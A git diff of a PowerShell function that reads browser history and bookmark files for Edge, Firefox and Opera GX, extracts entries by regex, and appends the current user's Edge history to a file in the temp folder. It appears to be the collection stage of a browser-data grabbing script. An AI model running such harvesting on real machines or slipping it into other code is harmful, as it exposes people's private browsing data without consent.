@@ -16,20 +16,17 @@ function Get-BrowserData {
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
     elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
     $Value | ForEach-Object {
-        $Key = $_
-        if ($Key -match $Search){
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
-                DataType = $DataType
-                Data = $_
-            }
+        [PSCustomObject]@{
+            User     = $env:UserName
+            Browser  = $Browser
+            DataType = $DataType
+            Data     = $_
         }
-    } 
+    }
 }
 
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
